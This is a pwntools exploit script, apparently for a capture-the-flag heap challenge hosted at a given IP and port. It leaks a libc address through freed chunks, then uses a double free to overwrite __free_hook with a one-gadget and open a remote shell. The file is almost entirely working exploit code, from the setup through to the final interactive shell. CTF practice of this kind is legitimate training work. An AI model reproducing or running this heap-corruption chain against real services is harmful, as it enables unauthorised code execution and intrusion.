#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 128.199.210.141 --port 5002 ./challenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./challenge_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '128.199.210.141'
port = int(args.PORT or 5002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def add(size,name,price):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(size))
    io.sendlineafter(": ",name)
    io.sendlineafter(": ",str(price))

def delete(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(idx))

def view():
    io.sendlineafter("> ","3")

for i in range(8): # 0 - 7
    add(0xff,"junk",0xff)

for i in range(8): # 7 - 0
    delete(7-i)

libc = ELF("./libc.so.6")

view()

io.recvuntil('"index": 0,')
io.recvuntil('"name": "')
leak = u64(io.recvuntil("\",",drop=True).ljust(8,"\x00"))
print hex(leak)
libc.address = leak - 0x3ebca0
print hex(libc.address)

for i in range(16): # 8 - 16 + 8
    add(0x30,"junk",0xff)

for i in range(4):
    delete(15-i) # 15 - 11

delete(10)
delete(10)

for i in range(3):
    add(0x30,"/bin/sh\x00",0xff)

add(0x30,p64(libc.sym['__free_hook']),0xff) # Ke __free_hook
add(0x40,"junk",0xff) # Junk 1 
add(0x30,p64(libc.address + 0x4f302),0xff) # Junk 1 + Isi __free_hook ( One Gadget )
delete(0)

io.interactive()

